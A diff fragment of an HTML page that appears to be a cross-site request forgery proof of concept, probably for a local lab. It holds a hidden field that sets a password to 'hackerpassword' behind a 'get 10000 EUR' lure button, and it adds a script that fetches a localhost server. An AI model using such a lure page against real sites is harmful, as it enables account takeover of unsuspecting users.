@@ -14,5 +14,10 @@
         <input name="confirm_password" type="hidden" value="hackerpassword" />
         <input name="submit" type="submit" value="Obtenez 10000 EUR" />
     </form>
+
+    <script>
+        fetch('http://localhost:3100')
+            .then(res => console.log(res.status));
+    </script>
 </body>
 </html>
